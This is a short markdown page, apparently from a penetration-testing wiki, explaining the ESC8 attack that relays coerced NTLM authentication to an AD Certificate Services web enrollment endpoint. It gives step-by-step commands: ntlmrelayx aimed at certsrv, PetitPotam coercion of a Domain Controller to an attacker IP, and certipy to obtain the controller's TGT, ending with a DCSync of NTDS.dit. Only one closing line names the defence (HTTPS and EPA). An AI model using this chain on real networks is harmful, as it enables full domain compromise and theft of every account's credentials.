---
title: 'ESC8: Web Enrollment NTLM Relay'
description: 'ESC8: Web Enrollment NTLM Relay.'
---
# ESC8: Web Enrollment NTLM Relay

ESC8 is where old-school NTLM relaying meets modern PKI destruction.

Active Directory Certificate Services supports a few HTTP-based enrollment endpoints (like the Web Enrollment interface `certsrv` or the Certificate Enrollment Service `CES`). 

By default, these HTTP endpoints support NTLM authentication but **do not require NTLM signing or HTTPS**. This means if you can coerce a Domain Controller or an Administrator to authenticate to your attacking machine, you can relay that authentication directly to the ADCS web endpoint and request a certificate as them.

## Requirements

* An ADCS server running HTTP web enrollment endpoints (`http://ca.domain.local/certsrv`).
* A way to coerce authentication (e.g., PetitPotam, PrinterBug).

## The Attack Path

### 1. Set up the Relay
Start `ntlmrelayx` and configure it to target the CA's web enrollment URL. Tell it to request a certificate using the standard `DomainController` or `Machine` template (since we will likely be relaying a machine account).
```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### 2. Coerce Authentication
Force the target machine (e.g., the Domain Controller) to authenticate to your attacking machine's IP.
```bash
# Using PetitPotam
python3 PetitPotam.py attacker_ip dc_ip
```

### 3. Catch the Cert
`ntlmrelayx` will catch the incoming NTLM authentication from the DC, relay it to the CA over HTTP, and request a certificate on behalf of the DC. Because the HTTP endpoint doesn't require signing, the CA accepts the relayed credentials and issues a base64-encoded PKCS12 certificate directly to your terminal.

### 4. Get the TGT
Take the base64 certificate, save it, and use it to request a TGT as the Domain Controller machine account.
```bash
certipy auth -pfx 'dc01.pfx' -dc-ip 192.168.100.1
```

!!! warning
    With a TGT for the Domain Controller (`DC01$`), you can perform a DCSync attack to dump the entire NTDS.dit. Game over. To prevent this, organizations must enforce HTTPS and EPA (Extended Protection for Authentication) on their CA web servers.
